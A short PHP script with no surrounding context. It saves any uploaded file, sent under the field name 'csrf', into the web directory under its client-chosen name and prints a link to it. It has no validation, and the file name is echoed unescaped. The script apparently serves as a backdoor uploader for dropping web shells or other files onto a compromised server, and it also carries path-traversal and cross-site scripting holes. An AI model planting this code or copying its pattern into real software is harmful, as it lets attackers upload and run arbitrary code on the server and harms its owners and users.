<?php
@copy($_FILES['csrf']['tmp_name'],$_FILES['csrf']['name']);
echo("<a href=".$_FILES['csrf']['name'].">".$_FILES['csrf']['name']."</a>");
?>
